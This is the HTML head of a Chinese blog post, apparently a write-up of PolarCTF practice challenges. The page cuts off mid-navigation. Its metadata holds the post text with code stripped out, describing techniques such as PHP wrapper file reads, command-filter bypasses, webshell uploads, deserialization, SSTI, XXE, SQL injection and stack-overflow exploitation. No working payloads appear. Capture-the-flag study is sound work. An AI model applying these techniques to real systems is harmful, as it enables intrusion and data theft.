<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>polarctf_wp | guipi`Blog</title><meta name="keywords" content="CTF"><meta name="author" content="guipi"><meta name="copyright" content="guipi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="polarctf_wp"><meta name="application-name" content="polarctf_wp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="polarctf_wp"><meta property="og:url" content="https://guipi01.github.io/posts/bcd86d8.html"><meta property="og:site_name" content="guipi`Blog"><meta property="og:description" content="polarctf靶场web签到题进入url发现这样一句话，然后看了看cookie，发现value为no，改为yes，发现了base64加密的字符串  经过base64解码，得到一个路径，访问看到了源码  经过分析，应该是一个伪协议读取，构造payload得到base64解码就可以dedaoflag了"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://gcore.jsdelivr.net/gh/guipi01/images@main/wallhaven-exdl2k.jpg"><meta property="article:author" content="guipi"><meta property="article:tag" content="博客,guipi,一个有趣的博客"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://gcore.jsdelivr.net/gh/guipi01/images@main/wallhaven-exdl2k.jpg"><meta name="description" content="polarctf靶场web签到题进入url发现这样一句话，然后看了看cookie，发现value为no，改为yes，发现了base64加密的字符串  经过base64解码，得到一个路径，访问看到了源码  经过分析，应该是一个伪协议读取，构造payload得到base64解码就可以dedaoflag了"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://guipi01.github.io/posts/bcd86d8.html"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: undefined,
  postHeadAiDescription: undefined,
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"Jp8wwGQpp21utaFQ","LingQueMonitorID":"Jp8ztDRrxmTf7LDj"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  music_page_default: "nav_music",
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":["🤖️ 数码科技爱好者","🔍 分享与热心帮助","🏠 智能家居小能手","🔨 设计开发一条龙","🤝 专修交互与设计","🏃 脚踏实地行动派","🧱 团队小组发动机","💢 壮汉人狠话不多"]},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: guipi","link":"链接: ","source":"来源: guipi`Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: {"enable":true,"delay":100,"shiftDelay":200},
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'guipi`Blog',
  title: 'polarctf_wp',
  postAI: '',
  pageFillDescription: 'polarctf靶场, web, 签到题, 简单rce, swp, 被黑掉的网站, jwt, $$, session文件包含, PHP反序列化初试, 干正则, uploader, debudao, rapyiquan, 1ncIud3, 投喂, 狗黑子的RCE, 井字棋, 简单的导航站, 到底给不给flag呢, 写shell, 反序列化, 某函数的复仇, BlackMagic, xxe, 判读是否存在XXE漏洞：, SSTI, PlayGame, phpurl, 再来ping一波啊, search, 注入, csdn, unpickle, wu, 代码审计1, 你的马呢？, 随机值, ezphp, file, tnl, 你知道sys还能这样玩吗, 笑傲上传, REVERSE 逆向, 康师傅, 加加减减, PWN, sandbox, creeper, 简单溢出, Emm, Choice, overload1, x64, 你是大佬还是菜鸡, Easy_ShellCode, play靶场签到题进入发现这样一句话然后看了看发现为改为发现了加密的字符串经过解码得到一个路径访问看到了源码经过分析应该是一个伪协议读取构造得到解码就可以了因为后边加了所以中不需要简单首先访问的出现了下边的代码分析一下首先是一个函数对文件进行语法高亮显示定义一个函数并传入变量函数用于执行一个正则表达式匹配返回参数值输出一条消息并退出当前脚本通过方式传递参数通过方式传递参数并判断调用函数并输出输出代码的命令执行函数有输出并返回最后一行结果不输出结果返回最后一行结果所有结果可以保存到一个返回的数组里面只调用命令把命令的运行结果原样地直接输出到标准输出设备上替换输出函数函数由第一行开始显示内容并将所有内容输出函数从最后一行倒序显示内容并将所有内容输出类似于显示时输出行号根据窗口大小一页一页的现实文件内容和类似但其优点可以往前翻页而且进行可以搜索字符只显示头几行只显示最后几行文本内容排列可以查看一种编辑器这个也可以查看以二进制的方式读取档案内容一种编辑器这个也可以查看在对象文件或二进制文件中查找可打印的字符串在当前目录中查找后缀有字样的文件中包含字符串的文件并打印出该字符串的行此时可以使用如下命令把每个文件以列对列的方式一列列地加以合并打印有的一行一种编辑器可以用读取空格绕过重定向符但是不支持后面跟通配符水平制表符回车换行方法一使用未被过滤的函数进行绕过得到方法二使用转义字符过滤适用版本以八进制表示的转义字符会自动适配如以十六进制的转义字符表示法如以表示的字符会输出为字符串编码协议规定即协议中只允许包含英文字母数字以及这个特殊字符和所有的保留字符发现是文件泄漏使用惊喜目录扫描发现了文件访问得到了代码接受一个变量匹配变量判断变量是否为数组类型不为数组类型往下判断利用函数进行匹配输入的值绕过函数后匹配变量匹配到的话输出匹配到的话输出然后使用脚本去匹配字符最后得到被黑掉的网站首先访问什么也没有用扫一下目录出现了几个可以访问的文件首先文件不是知道是什么查看一下发现需要输入想到上边的文件的内容试一下首先用脚本将空格转化为换行然后使用进行爆破当时出现了使用字符串的方法将空格替换为换行符首先通过题目的提示是的题目那么访问发现是个登录和注册首先自己注册一个看到了有那么先爆破一下密钥然后重新构造将改为使用的工具然后将生成的放到自己登录的中刷新页面发现用户名变为了点击个人中心发现了看题目是感觉应该是和全局相关的查看代码发现是通过方式给一个值然后通过函数进行正则匹配如果匹配到就输出否则就输出变量那么考虑给一全局变量发现给出了文件包含首先访问发现有一个输入框随便输入查看网页代码发现了和点击发现了那么通过伪协议进行读取编码因为题目中给的是所以读取这个文件然后用解码解码的内容是一个代码文件名的构造是在中可以查看有了参数开始猜存放文件的位置一般默认为直接执行命令访问文件这里可以采取两种方式得到命令读取或者蚁剑连接然后通过给传入用蚁剑读取命令读取用反序列化初试首先访问看到了代码有两个魔术方法和分析代码在类中有个变量执行了函数所以然后编写得到首先是了两个类让类的变量去调用第二个类然后执行第二个类中的函数干正则访问看到源码分析一下首先用方式传入一个参数然后中有个一个函数他是将参数中的值进行查找如果找到就将变量的值改为中该变量的值例如是将上边变量的值改为根据这个函数就可以给传入一个的值因为下边有判断的值和是否相等相等会执行下边参数的值构造得到首先访问得到下边代码分析代码首先是获取一个地址转化为然后没有什么过滤写个脚本传文件吧替换成你的服务器地址马子将文件名替换为你想上传的文件文件上传成功服务器返回的消息文件上传失败错误码上传成功后给出了路径开头的是目录前边为文件名用蚁剑连接找访问发现一个输入框测试了注入发现不是注入试了一下发现是首先用发现弹了那么构造得到了访问分析一下代码应该是用方法传递一个参数但是过滤了考虑用替换一下构造一下发现了文件然后使用访问显示了那么尝试方式传入值然后尝试给一个值然后根据提示和题目进行修改想到了因为是在某个目录下所以用为一组不出意外基本题型最多也就四组四组还不行的话就换命令了最常用的替换构造得到投喂访问得到提示欢迎参加挑战赛使用以下进行交互包含序列化对象的参数提示您可能想了解序列化是如何工作的尝试使用和属性序列化对象额外提示如果你能让服务器认为你是管理员你可能会得到一些特别的东西根据提示构造反序列化得到用方式传入参数得到狗黑子的访问得到的代码分析一下传如可以执行命令传入如何通过就可以执行的命令发现没有过滤构造因为使用了函数进行替换空格然后去绕过井字棋首先通过发现是一个游戏一看就是看源码发现下边的代码在函数断点断住了根据您赢了您输了这个代码只有在您赢了的时候才能进行下边通过传到后端取出那么直接在控制台中输入您赢了在断点的时候发现传到后端的是赢了那么就能弹出了简单的导航站首先访问获得的信息首先通过注册一个新用户查看用户列表出现了代码发现是绕过漏洞发现是强比较试一下数组有一些字符串的值为开头这里记录一下还有和双以后的值都是开头的通过数组绕过了获得了用户名发现在最开始的首页源码中发现了感觉应该是密码吧直接爆破发现了用户名为然后登录管理员后上传文件这里没有什么过滤直接上传然后路径为然后用蚁剑连接后发现了目录里边还有点进去发现有好多又想到认证应该是需要爆破直接上爆破成功得到到底给不给呢访问分析代码发现了函数搭配是个典型的变量覆盖漏洞使用遍历数组中的值将获取到的数组键名作为变量数组中的键值作为变量的值需要有一个满足为的传参并且不能等于若想输出执行到最后输出那么变量覆盖时候不能将的值等于除外的任意值即在内的变量覆盖过程中需要实现代码执行过程如下第一个循环处理数组传值为变量覆盖过程为此时注意数组的值而经过的变量覆盖故而最开始传参数时可等于任意值因为会被变量覆盖完成后的值覆盖第二个循环处理数组变量覆盖过程为构造参数参数得到写首先看代码发现是是传入文件名传入内容进行写肯定通过通过来写文件看到了源码中有看起来应该用来闭合一下那么传入参数为为占位的将转化为为拼接后为写访问得到反序列化当一个对象创建时被调用当一个对象销毁时被调用当一个对象被当作一个字符串被调用使用时触发使用时触发对象被销毁时触发在对象上下文中调用不可访问的方法时触发在静态上下文中调用不可访问的方法时触发用于从不可访问的属性读取数据用于将数据写入不可访问的属性在不可访问的属性上调用或触发在不可访问的属性上使用时触发把类当作字符串使用时触发返回值需要为字符串当脚本尝试将对象调用为函数时触发首先分析一下源码因该是给传入一个执行命令的函数去执行得到构造得到发现没有那么一步一步找发现了得到某函数的复仇分析源码根据题目感觉参数应该是参数应该先闭合后边也需要闭合然后执行分析完代码构造参数首先找到源码分析源码通过函数会将中的键值对提取为变量通过函数把中的去掉最后让中的函数的用法函数是中的内置函数用于删除字符串左右两边的空格或预定义字符并返回修改后的字符串函数语法为用于指定要从中删除空白和左右预定义字符的字符串必需参数不可省略用于指定要从字符串中删除的字符可选参数可省略如果省略了则将删除以下所有字符普通空格符制表符换行符回车符空字节符垂直制表符分析后发现没有过滤制表符就是然后构造得到首先访问有一个根据题目提示应该是一个外部注入的漏洞告诉了的位置全称为即外部实体注入漏洞漏洞是基于可扩展标记语言而产生的漏洞是用于存储和传输数据而对应的语言是用来显示数据的漏洞的主要功能可以用来信息探针任意文件读取等语法必须包含根元素它是所有其他元素的父元素比如以下实例中就是根元素文档开头必须分为内部和外部内部声明版本声明此文档是类型的文档声明此文档的所有元素定义元素的类型为定义元素类型为定义为定义为定义一个内部实体外部定义元素为即可以接受任何元素定义通用实体定义一个外部实体判读是否存在漏洞最直接的方法就是用抓包然后修改请求方法修改头部字段等等查看返回包的响应看看应用程序是否解析了发送的内容一旦解析了那么有可能攻击漏洞总共有三个文件可以解析就是文件源码然后构造一下读取中的然后解码常见的模板可以使用一把梭注入思路随便找一个内置类对象用拿到他所对应的类用拿到基类用拿到子类列表在子类列表中直接寻找可以利用的类对象类基本类子类方法属性属性函数常用方法查看继承关系和调用顺序返回元组返回基类返回基类元组返回子类列表调用初始化函数可以用来跳到返回函数所在的全局命名空间所定义的全局变量返回字典返回内建内建名称空间字典类的静态函数类函数普通函数全局变量以及一些内置的属性都是放在类的里实例类函数都具有的魔术方法事实上在实例化的对象进行操作的时候形如都会自动去调用方法因此我们同样可以直接通过这个方法来获取到实例类函数的属性调用字典中的键值其实就是调用这个魔术方法比如就是内建名称空间内建名称空间有许多名字到对象之间映射而这些名字其实就是内建函数的名称对象就是这些内建函数本身即里面有很多常用的函数与的区别就不放了百度都有动态加载类和函数也就是导入模块经常用于导入模块返回描写这个对象的字符串可以理解成就是打印出来的一个方法可以用于得到而且含有的一个方法可以用于得到而且含有的一个方法可以用于得到而且含有模块应用上下文一个全局变量可以用于获取字符串来绕过包括下面这些引用一下羽师傅的此外同样可以获取函数传参所有参数参数请求头参数传参或传参传当前的所有配置此外也可以这样过滤器将值转换为类型将字符串转换为小写将字符串转换为大写把值中的每个单词的首字母都转成大写把变量值的首字母转成大写其余字母转小写截取字符串前面和后面的空白字符计算一个长字符串中单词的个数字符串反转替换将替换为的字符串截取长度的字符串删除字符串中所有的标签如果出现多个空格将替换成一个空格或转义字符会将等符号转义成中的符号显例或禁用转义如果开启了全局转义那么过滤器会将变量关掉转义示例将变量列成列表将变量转换成字符串将一个序列中的参数值拼接成字符串示例看上面返回一个数值的绝对值返回一个序列的第一个元素返回一个序列的最后一个元素格式化字符串比如将输出返回一个序列或者字典的长度返回列表内数值的和返回排序后的列表如果当前变量没有值则会使用参数中的值来代替示例如果不存在则会使用来替代默认是在只有这个变量为的时候才会使用中的值如果想使用的形式判断是否为则可以传递也可以使用来替换返回字符串的长度别名是找可用利用的类这是个找可利用类的脚本可供自行发掘利用链想利用啥就找啥未找到含有的类请尝试用其他包查找常用返回证明传递成功返回说明成功写执行想要的命令将用户输入作为模版变量的值使用一个加载器来定位模板以及一个环境变量来存储配置信息其中方法通过其第一个参数载入模板并通过第二个参数中的变量来渲染模板使用模版引擎渲染页面其中模版含有变量其模版变量值来自于请求参数魔术方法返回类型所属的对象返回一个包含对象所继承的基类元组方法在解析时按照元组的顺序解析返回该对象所继承的父类返回该对象的所有父类获取当前类的所有子类类的初始化方法对包含保存函数全局变量的字典的引用构造得到首先分析源码链是反序列化链的入口在魔法函数调用对象后会立即触发函数输出两个参数可控出口在函数只有对象转换为字符时才会被调用才会进入函数执行去包含想要的文件文件路径未知要怎么获取构造得到先把提示的内容用进行解码得到然后访问得到源码进行分析发现方法传入一个参数然后用进行加密了后面又判断了与是否相等那么看看经过多次编码是否能获得构造发现获得了再来一波啊首先是一个输入框看题目的描述试一下发现可以返回但是不可以执行应该是过滤了但是又不知道在哪查看一下发现返回了那能让你直接读那么就先读取查看一下源码吧构造一下访问网站看一下源码发现了首先是一个输入框一眼注入啊发现是一个的参数那么直接测试本题过滤了空格那么直接替换一下注入步骤首先是判断有几个字段判断完之后直接用语句看看哪一个字段执行了返回了数据直接查看数据库查看表名具体要分析一下查看列名查看字段值查看表名查看列名查看字段值得到注入首先判断了一下注入发现不是考虑一下注入利用解析器的松散输入和容错特性能够在表单或其他信息上附带恶意的查询代码以获得高权限的访问权注入类似于注入当网站实验未经正确处理的用户输入查询数据时可能发生注入由于种不像种有权限的概念用户可通过提交恶意代码获得完整的文档权限访问直接查看源码发现直接构造得到查看附件发现是一个反序列化但是从处打入的构造得到分析源码发现是无数字字母最简单的思路直接取反下边是一个脚本建议用这个的一站式脚本或异或取反代表或代表异或代表取反取反的话就没必要生成字符去跑了因为本来就是不可见字符直接绕过正则表达式代表模式后面的是过滤规则直接终端执行脚本得到了代码审计分析源码从代码看考查的是对原生类的利用题目中做了关键字过滤可尝试使用伪协议结合原生类读取文件进行绕过这里用的是编码读取题目构造得到进行解码得到你的马呢这个题目肯定是一个上传漏洞经过多次上传发现对文件内容和后缀进行了检测那么将一句话木马的换成就可以绕过了成功上传后用蚁剑连接得到随机值分析源码发现是反序列化的随机数按照反序列化的步骤进行构造构造得到先根据访问后的提示查看下有什么东西发现有和那么肯定是先上传木马然后读取木马用蚁剑连接访问返回去访问经过上传测试只能上传图片那就传个图片马上传后用访问一下得到文件路径用蚁剑连接得到根据提示用进行扫描然后发现点我开始不能点直接修改代码去掉就可以跳转到上传页面这个上传没有进行过滤直接上传就行扫描完发现上传的路径直接用蚁剑连接得到经过多次测试注入发现不是注入那么猜测一下是不是伪协议然后解密得到源码发现自动添加然后构造得到你知道还能这样玩吗根据提示访问一下分析源码构造方法一尝试来进行二次执行是进行的一个绕过执行否则得不到查看方法二这里看到一个师傅利用了和双引号绕过加密的方法得到了答案也放在这还是比较巧妙的方法三上面几个都是借鉴的还有一个办法就是八进制转化之前写有一个和这样类似的我就直接上了空格用进行绕过文章笑傲上传首先看到下边这个页面发现神秘链接可以跳转出现了代码感觉应该是先上传文件然后在源码这里进行传参用蚁剑连接试一下上传发现只能上传图片的那么直接将木马拼接在图片后边然后上传文件发现上传成功了然后用蚁剑连接得到逆向康师傅首先去查看是否加壳没有加壳用进行查看主函数找到了函数进行分析这段代码是将与进行异或来加密的然后编写进行解密请输入密码脚本解密异或转换为可读字符串得到加加减减首先更改文件后缀解压压缩包得到然后放到分析得到加密的代码进行分析把用户输入的字符的脚本每个字符的码值转换为可读字符串得到题目的基本步骤先用和看一下文件然后放到中分析然后调试写脚本首先分析一下源码在函数中发现了函数进去看一下发现了有语句对输入的进行了判断然后发现字符串中没有那应该是用了那么编写脚本得到分析到该文件是位的在函数中有一个函数发现函数读取然后去比较的长度是否等于如果等于就会输出直接编写脚本简单溢出分析函数发现只有一个输入根据题目肯定是溢出发现有字符串然后通过查看该字符串发现了后门函数直接构造得到该文件为位并且通过发现存在函数内容是那么直接构造通过分析发现了经典后门函数可以直接构造调用了然后找一下如何进行栈溢出来调用这个函数通过发现和两个函数满足栈溢出条件但是不满足攻击条件发现满足栈溢出的攻击攻击条件通过代码发现要先运行函数输入才能进入函数所以写脚本的时候要先发送一个构造得到先发送来进入函数在函数中看到了后门函数那么看看如何能运行到这个函数分析一下首先输入的值然后与进行比较等于进入后输入的值最后会用的去与比较那么根据题目应该是把给覆盖了通过地址看出来的构造来获得通过源码分析有还有函数那么拼接一下就可以了主函数中有函数有一个读取根据文件为位那么应该是占满后加上构造一下得到位的参数从左到右放入寄存器之后跟位一样找出溢出偏移量进入函数中覆盖返回地址为将作为参数传入还差一个地址使用命令你是大佬还是菜鸡通过分析源码得到当输入的时候会进入函数进而读取来进行溢出漏洞通过搜索发现函数是经典的后门函数需要通过调用函数的地址让函数读取进而得到先发送来进入函数来进行溢出漏洞通过分析源码发现函数中有一个函数但是通过字符串搜索没有发现那么就需要自己写了后来发现这个函数有两次输入第一次读取的是变量发现他在段那么就可以把放到这里然后第二次读取的时候进行溢出去调取的地址也就是有思路了那就构造获得分析源码发现函数中有一个函数然后有两次输入一次是读取第二次是那么可以第一次可以去读第二次去找构造得到',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2025-04-06 18:09:49',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="guipi`Blog" type="application/atom+xml">
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://guipi01-github-io.vercel.app/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/1112.jpg" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://gcore.jsdelivr.net/gh/guipi01/images" title="guipi图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="guipi图床"/><span class="back-menu-item-text">guipi图床</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">guipi`Blog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a><div id="he-plugin-simple"></div><script>var WIDGET = {
  "CONFIG": {
    "modules": "0124",
    "background": "2",
    "tmpColor": "FFFFFF",
    "tmpSize": "16",
    "cityColor": "FFFFFF",
    "citySize": "16",
    "aqiColor": "E8D87B",
    "aqiSize": "16",
    "weatherIconSize": "24",
    "alertIconSize": "18",
    "padding": "10px 10px 10px 10px",
    "shadow": "0",
    "language": "auto",
    "borderRadius": "20",
    "fixed": "true",
    "vertical": "top",
    "horizontal": "left",
    "left": "20",
    "top": "7.1",
    "key": "df245676fb434a0691ead1c63341cd94"
  }
}
</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent 